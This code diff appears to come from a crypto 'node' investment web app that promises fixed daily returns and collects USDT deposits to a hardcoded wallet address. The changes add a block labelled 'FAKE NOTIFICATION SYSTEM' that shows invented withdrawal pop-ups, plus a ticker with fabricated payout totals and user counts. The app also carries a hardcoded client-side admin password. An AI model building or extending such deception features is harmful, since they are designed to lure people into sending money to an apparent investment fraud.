@@ -22,22 +22,47 @@
 
         .glass-panel { background: var(--glass); backdrop-filter: blur(50px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 35px; }
         .btn-master { background: linear-gradient(90deg, var(--neon-red), var(--neon-pink)); color: white; font-weight: 800; padding: 18px; border-radius: 20px; width: 100%; border: none; cursor: pointer; box-shadow: 0 10px 30px rgba(255, 0, 60, 0.4); text-transform: uppercase; letter-spacing: 1px; }
-        .input-dark { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 18px; color: white; width: 100%; outline: none; transition: 0.3s; }
-        .input-dark:focus { border-color: var(--neon-red); box-shadow: 0 0 15px rgba(255, 0, 60, 0.2); }
+        .input-dark { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 18px; color: white; width: 100%; outline: none; }
         .nav-item { color: #444; text-align: center; cursor: pointer; font-size: 9px; font-weight: 800; transition: 0.3s; }
         .nav-item.active { color: var(--neon-red); text-shadow: 0 0 12px var(--neon-red); }
         .hidden { display: none !important; }
-        .node-card { transition: 0.4s; border: 1px solid rgba(255,255,255,0.03); }
-        .node-card:hover { transform: translateY(-5px); border-color: var(--neon-red); }
+
+        /* Fake Notification Styling */
+        #fake-notif {
+            position: fixed; bottom: 100px; left: 20px; right: 20px;
+            background: rgba(10, 10, 10, 0.95); border-left: 4px solid var(--neon-red);
+            border-radius: 15px; padding: 12px; z-index: 5000;
+            display: none; animation: slideUp 0.5s ease-out; backdrop-filter: blur(10px);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+        }
+        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        
+        .ticker-wrap { background: rgba(255, 0, 60, 0.05); border-bottom: 1px solid rgba(255, 0, 60, 0.1); overflow: hidden; padding: 10px 0; }
+        .ticker { display: inline-block; animation: ticker 30s linear infinite; font-size: 10px; font-weight: 800; white-space: nowrap; }
+        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
     </style>
 </head>
 <body>
+
+    <div id="fake-notif">
+        <div class="flex items-center gap-3">
+            <div class="w-10 h-10 bg-green-500/10 rounded-full flex items-center justify-center">
+                <i class="fa-solid fa-circle-check text-green-500"></i>
+            </div>
+            <div>
+                <p id="notif-text" class="text-[10px] font-black uppercase italic text-white"></p>
+                <p class="text-[8px] text-zinc-500 font-bold uppercase">Transaction Verified • Just Now</p>
+            </div>
+        </div>
+    </div>
 
     <div id="splash" class="fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center">
         <div class="w-28 h-28 splash-logo rounded-[2.8rem] flex items-center justify-center text-6xl font-black text-white">N</div>
         <h1 style="font-family: 'Syncopate'" class="mt-10 text-sm tracking-[0.5em] text-white">NEXUS<span class="text-[#ff003c]">INFINITY</span></h1>
         <p class="text-[8px] text-zinc-500 mt-6 font-black uppercase tracking-[0.3em] animate-pulse">Establishing Crypto Tunnel...</p>
     </div>
+
+    <div class="ticker-wrap"><div class="ticker">BTC/USDT $64,210.50 ▲ +2.4% &nbsp;&nbsp; ETH/USDT $3,421.12 ▼ -0.5% &nbsp;&nbsp; TOTAL TERMINALS ACTIVE: 4,821 &nbsp;&nbsp; TOTAL PAYOUTS: $14,208,410.00</div></div>
 
     <div id="auth-section" class="min-h-screen p-8 flex flex-col justify-center hidden">
         <div class="max-w-sm mx-auto w-full space-y-12">
@@ -51,10 +76,7 @@
                 <input type="text" id="l-user" placeholder="Account ID" class="input-dark">
                 <input type="password" id="l-pass" placeholder="Security Key" class="input-dark">
                 <button onclick="handleLogin()" class="btn-master">Authorize Connection</button>
-                <div class="flex justify-between px-2 pt-2">
-                    <p onclick="toggleAuth(true)" class="text-[9px] text-zinc-400 font-black uppercase cursor-pointer hover:text-white transition">Register ID</p>
-                    <p class="text-[9px] text-zinc-600 font-black uppercase cursor-not-allowed">Forgot Key?</p>
-                </div>
+                <p onclick="toggleAuth(true)" class="text-center text-[10px] text-zinc-400 font-black uppercase cursor-pointer pt-2">Register Terminal ID</p>
             </div>
 
             <div id="signup-ui" class="space-y-4 p-8 glass-panel border border-white/10 hidden">
@@ -71,8 +93,8 @@
             <div class="flex items-center gap-3">
                 <div id="admin-trigger" class="w-10 h-10 bg-zinc-900 rounded-xl flex items-center justify-center font-black border border-white/10">N</div>
                 <div class="flex flex-col">
-                    <span id="nav-user" class="text-sm font-black italic text-[#ff003c] leading-none uppercase">...</span>
-                    <span class="text-[8px] text-green-500 font-black uppercase mt-1 animate-pulse">Online</span>
+                    <span id="nav-user" class="text-sm font-black italic text-[#ff003c] uppercase leading-none">...</span>
+                    <span class="text-[8px] text-green-500 font-black uppercase mt-1 animate-pulse">● Synchronized</span>
                 </div>
             </div>
             <button onclick="logout()" class="w-10 h-10 rounded-full bg-zinc-900/50 flex items-center justify-center border border-white/5"><i class="fa-solid fa-power-off text-zinc-600"></i></button>
@@ -81,55 +103,51 @@
         <div id="page-home" class="p-6 space-y-6">
             <div class="glass-panel p-8 bg-gradient-to-br from-zinc-900 via-zinc-950 to-black relative overflow-hidden border border-white/10">
                 <div class="relative z-10">
-                    <p class="text-[9px] font-black text-zinc-500 uppercase tracking-widest mb-2">Institutional Net Equity</p>
+                    <p class="text-[9px] font-black text-zinc-500 uppercase tracking-widest mb-2">Total Net Equity</p>
                     <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter text-white">$0.00</h2>
                     <div class="mt-8 flex justify-between border-t border-white/5 pt-6">
-                        <div><p class="text-[7px] text-zinc-500 uppercase mb-1">Yield Accumulation</p><p id="profit-txt" class="text-xl font-black text-[#ff00ff]">+$0.00</p></div>
-                        <div class="text-right"><p class="text-[7px] text-zinc-500 uppercase mb-1">Network Stability</p><p class="text-[9px] font-black text-blue-500 animate-pulse">OPTIMIZED</p></div>
+                        <div><p class="text-[7px] text-zinc-500 uppercase mb-1">Accumulated Profit</p><p id="profit-txt" class="text-xl font-black text-[#ff00ff]">+$0.00</p></div>
+                        <div class="text-right"><p class="text-[7px] text-zinc-500 uppercase mb-1">Active Users</p><p class="text-[9px] font-black text-blue-500 animate-pulse">4,821 LIVE</p></div>
                     </div>
                 </div>
             </div>
             
             <div class="flex justify-between items-center px-1">
-                <h3 class="text-[10px] font-black text-zinc-600 uppercase tracking-widest">Available Nodes</h3>
-                <span class="text-[8px] bg-[#ff003c]/20 text-[#ff003c] px-2 py-1 rounded-full font-bold">LIVE FEED</span>
+                <h3 class="text-[10px] font-black text-zinc-600 uppercase tracking-widest">Global Nodes</h3>
+                <span class="text-[8px] bg-green-500/10 text-green-500 px-2 py-1 rounded-full font-bold">15 NODES READY</span>
             </div>
             <div id="nodes-market" class="grid gap-4"></div>
         </div>
 
         <div id="page-finance" class="p-6 space-y-8 hidden">
-            <div class="glass-panel p-7 space-y-6 border border-white/5">
+            <div class="glass-panel p-7 space-y-6">
                 <h3 class="text-lg font-black italic text-[#ff003c] uppercase">Capital Injection</h3>
                 <div class="bg-black/60 p-5 rounded-2xl border border-white/5">
-                    <p class="text-[7px] text-zinc-500 font-black mb-1 uppercase tracking-widest">USDT TRC20 / Binance Pay</p>
-                    <div class="flex items-center justify-between">
-                        <p class="text-[11px] font-black text-white break-all pr-4">TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
-                        <i class="fa-solid fa-copy text-[#ff00ff]" onclick="alert('Address Copied!')"></i>
-                    </div>
+                    <p class="text-[7px] text-zinc-500 font-black mb-1 uppercase tracking-widest">USDT TRC20 / BINANCE PAY</p>
+                    <p class="text-[11px] font-black text-white break-all">TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
                 </div>
                 <input type="number" id="dep-amt" placeholder="Deposit Amount ($)" class="input-dark">
-                <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="input-dark">
+                <input type="text" id="dep-tid" placeholder="Transaction TID" class="input-dark">
                 <div>
-                    <p class="text-[9px] text-zinc-500 mb-3 font-bold uppercase">Screen Shot / Proof Image:</p>
-                    <input type="file" id="dep-proof" accept="image/*" class="text-[10px] text-zinc-500 block w-full file:mr-4 file:py-2.5 file:px-6 file:rounded-full file:bg-zinc-800 file:text-white file:border-0 file:font-black">
+                    <input type="file" id="dep-proof" accept="image/*" class="text-[10px] text-zinc-500 block w-full file:mr-4 file:py-2 file:px-4 file:rounded-full file:bg-zinc-800 file:text-white file:border-0">
                     <img id="preview-img" class="mt-4 w-full rounded-2xl border border-white/10 hidden">
                 </div>
-                <button onclick="submitDep()" class="btn-master">Initialize Injection</button>
+                <button onclick="submitDep()" class="btn-master">Authorize Injection</button>
             </div>
 
-            <div class="glass-panel p-7 space-y-6 border border-white/5">
-                <h3 class="text-lg font-black italic uppercase">Capital Payout</h3>
+            <div class="glass-panel p-7 space-y-6">
+                <h3 class="text-lg font-black italic uppercase text-[#ff00ff]">Capital Payout</h3>
                 <select id="w-method" class="input-dark bg-zinc-900">
                     <option value="Binance Pay">Binance Pay (ID)</option>
                     <option value="Trust Wallet">Trust Wallet (TRC20)</option>
-                    <option value="OKX">OKX Exchange</option>
-                    <option value="Bybit">Bybit Network</option>
+                    <option value="OKX Exchange">OKX Exchange</option>
+                    <option value="Bybit Network">Bybit Network</option>
                     <option value="KuCoin">KuCoin Node</option>
                     <option value="Kraken">Kraken Terminal</option>
                     <option value="Coinbase">Coinbase Wallet</option>
                 </select>
-                <input type="number" id="w-amt" placeholder="Amount to Withdraw ($)" class="input-dark">
-                <input type="text" id="w-addr" placeholder="Wallet Address / Method ID" class="input-dark">
+                <input type="number" id="w-amt" placeholder="Withdrawal Amount ($)" class="input-dark">
+                <input type="text" id="w-addr" placeholder="Destination Address / ID" class="input-dark">
                 <button onclick="submitWith()" class="btn-master !bg-zinc-800">Process Payout</button>
             </div>
         </div>
@@ -142,12 +160,11 @@
         <div id="page-trust" class="p-6 space-y-6 hidden">
             <div class="glass-panel p-6 space-y-4">
                 <h3 class="text-[10px] font-black text-[#ff003c] uppercase tracking-widest">Global FAQ</h3>
-                <details class="bg-black/40 p-4 rounded-2xl border border-white/5"><summary class="text-[11px] font-black uppercase">Is my capital secure?</summary><p class="text-[10px] text-zinc-500 mt-2">All funds are locked in decentralized cold-storage nodes with end-to-end institutional encryption.</p></details>
-                <details class="bg-black/40 p-4 rounded-2xl border border-white/5"><summary class="text-[11px] font-black uppercase">How to add more nodes?</summary><p class="text-[10px] text-zinc-500 mt-2">Simply deposit funds into your Vault and select "Deploy" on any available node in the CORE market.</p></details>
+                <details class="bg-black/40 p-4 rounded-2xl border border-white/5"><summary class="text-[11px] font-black uppercase">Capital Security?</summary><p class="text-[10px] text-zinc-500 mt-2">All funds are locked in cold-storage nodes with institutional-grade encryption.</p></details>
             </div>
             <div class="space-y-2">
-                <div onclick="alert('PRIVACY:\nNo data is shared with third parties. Terminal IDs are anonymized.')" class="glass-panel p-6 flex justify-between items-center text-[11px] font-black"><span>PRIVACY POLICY</span><i class="fa-solid fa-chevron-right opacity-30"></i></div>
-                <div onclick="alert('TERMS:\nMinimum withdrawal: $5. Minimum deposit: $10. Referral bonus: 10%.')" class="glass-panel p-6 flex justify-between items-center text-[11px] font-black"><span>TERMS OF SERVICE</span><i class="fa-solid fa-chevron-right opacity-30"></i></div>
+                <div onclick="alert('Privacy Protocol: End-to-end encrypted.')" class="glass-panel p-6 flex justify-between items-center text-[11px] font-black"><span>PRIVACY POLICY</span><i class="fa-solid fa-chevron-right opacity-30"></i></div>
+                <div onclick="alert('Terms: Min Deposit $10. Min Withdrawal $5.')" class="glass-panel p-6 flex justify-between items-center text-[11px] font-black"><span>TERMS OF SERVICE</span><i class="fa-solid fa-chevron-right opacity-30"></i></div>
             </div>
         </div>
 
@@ -180,7 +197,7 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // Unlimited Nodes Configuration (10+5)
+        // Nodes Configuration
         const nodesArr = [
             ...Array.from({length: 10}, (_, i) => ({ id: i+1, type: 'Standard', title: `Node-S${i+1}`, price: (i+1)*15, daily: ((i+1)*1.5).toFixed(2), days: 30 })),
             ...Array.from({length: 5}, (_, i) => ({ id: i+11, type: 'Apex Elite', title: `Apex-Elite-0${i+1}`, price: (i+1)*400, daily: ((i+1)*55).toFixed(2), days: 45 }))
@@ -188,6 +205,8 @@
 
         window.onload = () => {
             renderNodes();
+            // Start Fake Notifications Logic
+            setInterval(showFakeNotif, 12000);
             setTimeout(() => {
                 document.getElementById('splash').style.opacity = '0';
                 setTimeout(() => {
@@ -199,15 +218,27 @@
             }, 3000);
         };
 
+        // FAKE NOTIFICATION SYSTEM
+        const fakeUsers = ["ID 482x...", "ID 109x...", "ID 734x...", "ID 551x...", "ID 218x...", "ID 903x...", "ID 662x..."];
+        const fakeMethods = ["Binance", "Trust Wallet", "OKX", "Bybit", "Kraken"];
+        function showFakeNotif() {
+            const user = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
+            const method = fakeMethods[Math.floor(Math.random() * fakeMethods.length)];
+            const amount = Math.floor(Math.random() * (800 - 20 + 1)) + 20;
+            const notif = document.getElementById('fake-notif');
+            document.getElementById('notif-text').innerText = `${user} withdrew $${amount} via ${method}`;
+            notif.style.display = 'block';
+            setTimeout(() => { notif.style.display = 'none'; }, 5000);
+        }
+
         function renderNodes() {
             document.getElementById('nodes-market').innerHTML = nodesArr.map(n => `
-                <div class="glass-panel p-6 flex justify-between items-center node-card ${n.type.includes('Apex') ? 'border-[#ff003c]' : ''}">
+                <div class="glass-panel p-6 flex justify-between items-center ${n.type.includes('Apex') ? 'border-[#ff003c]' : ''}">
                     <div><p class="text-[7px] font-black ${n.type.includes('Apex') ? 'text-[#ff003c]' : 'text-zinc-500'} uppercase mb-1">${n.type}</p><h4 class="text-xl font-black italic">${n.title}</h4><p class="text-[9px] font-black text-green-500">+$${n.daily}/Day</p></div>
                     <div class="text-right"><p class="text-lg font-black">$${n.price}</p><button onclick="buyNode(${n.id})" class="bg-white text-black px-5 py-2 rounded-xl text-[9px] font-black mt-1 uppercase">Deploy</button></div>
                 </div>`).join('');
         }
 
-        // Image Handling (Base64)
         document.getElementById('dep-proof').onchange = (e) => {
             const reader = new FileReader();
             reader.readAsDataURL(e.target.files[0]);
@@ -222,12 +253,12 @@
             const amt = document.getElementById('dep-amt').value;
             const tid = document.getElementById('dep-tid').value;
             const proof = document.getElementById('preview-img').src;
-            if(!amt || !tid || !proof) return alert("Missing Protocol Data!");
+            if(!amt || !tid || !proof) return alert("Protocol Data Missing!");
             const hRef = push(ref(db, `users/${user}/history`));
             const entry = { user, amount: amt, tid, proof, status: 'pending', date: new Date().toLocaleString(), type: 'Deposit', hKey: hRef.key };
             await set(hRef, entry);
             await set(ref(db, `admin/deposits/${hRef.key}`), entry);
-            alert("Deposit Logged!");
+            alert("Deposit Protocol Logged!");
         };
 
         function showDashboard(uid) {
@@ -249,7 +280,6 @@
             });
         }
 
-        // Admin Secret Trigger (4 Taps)
         let taps = 0; document.getElementById('admin-trigger').onclick = document.getElementById('logo-tap').onclick = () => {
             taps++; if(taps === 4) { if(prompt("Access Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; }
         };
@@ -263,7 +293,7 @@
                         <p class="text-[9px] text-zinc-500">TID: ${l.tid}</p>
                         <img src="${l.proof}" class="w-full rounded-xl border border-white/10" onclick="window.open(this.src)">
                         <button onclick="approveDep('${id}','${l.user}',${l.amount},'${l.hKey}')" class="w-full bg-green-600 py-4 rounded-2xl text-[11px] font-black uppercase">Approve Capital</button>
-                    </div>`).join('') : '<p class="text-center text-xs opacity-30 uppercase tracking-widest">No protocol pending</p>';
+                    </div>`).join('') : '<p class="text-center text-xs opacity-30">No protocols pending</p>';
             });
         }
 
